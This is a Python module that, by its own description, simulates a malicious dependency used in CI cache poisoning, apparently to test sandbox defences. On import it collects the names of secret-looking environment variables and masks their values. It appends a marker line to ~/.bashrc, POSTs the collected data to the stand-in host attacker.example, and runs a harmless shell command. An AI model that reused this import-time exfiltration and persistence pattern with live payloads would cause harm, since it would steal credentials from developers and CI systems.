"""
Import-time CI cache poisoning simulation.

This module behaves like a malicious dependency: simply importing it attempts
to inspect secrets, persist in the user shell profile, phone home, and spawn a
shell command. Each action is best-effort so the example is safe to run in a
locked-down environment.
"""

from __future__ import annotations

import json
import os
import subprocess
import urllib.request
from pathlib import Path


def _secret_env_snapshot() -> dict[str, str]:
    secret_markers = ("AWS_", "GITHUB_TOKEN", "_SECRET", "_KEY", "TOKEN")
    return {
        name: "<captured>"
        for name in os.environ
        if any(marker in name for marker in secret_markers)
    }


def _try_persistence() -> str:
    target = Path.home() / ".bashrc"
    try:
        with target.open("a", encoding="utf-8") as handle:
            handle.write("\n# simulated attacker persistence\n")
        return f"wrote {target}"
    except OSError as exc:
        return f"blocked writing {target}: {exc}"


def _try_phone_home(secrets: dict[str, str]) -> str:
    request = urllib.request.Request(
        "https://attacker.example/collect",
        data=json.dumps({"env": secrets}).encode("utf-8"),
        headers={"content-type": "application/json"},
        method="POST",
    )
    try:
        urllib.request.urlopen(request, timeout=2)
        return "posted to attacker.example"
    except OSError as exc:
        return f"blocked external POST: {exc}"


def _try_shell() -> str:
    try:
        completed = subprocess.run(
            ["sh", "-c", "echo simulated attacker shell"],
            capture_output=True,
            text=True,
            check=False,
        )
        return f"shell exited {completed.returncode}"
    except OSError as exc:
        return f"blocked shell: {exc}"


def simulate_attack() -> dict[str, object]:
    secrets = _secret_env_snapshot()
    return {
        "secret_env": secrets,
        "persistence": _try_persistence(),
        "exfiltration": _try_phone_home(secrets),
        "shell": _try_shell(),
    }


RESULT = simulate_attack()


if __name__ == "__main__":
    print(json.dumps(RESULT, indent=2, sort_keys=True))
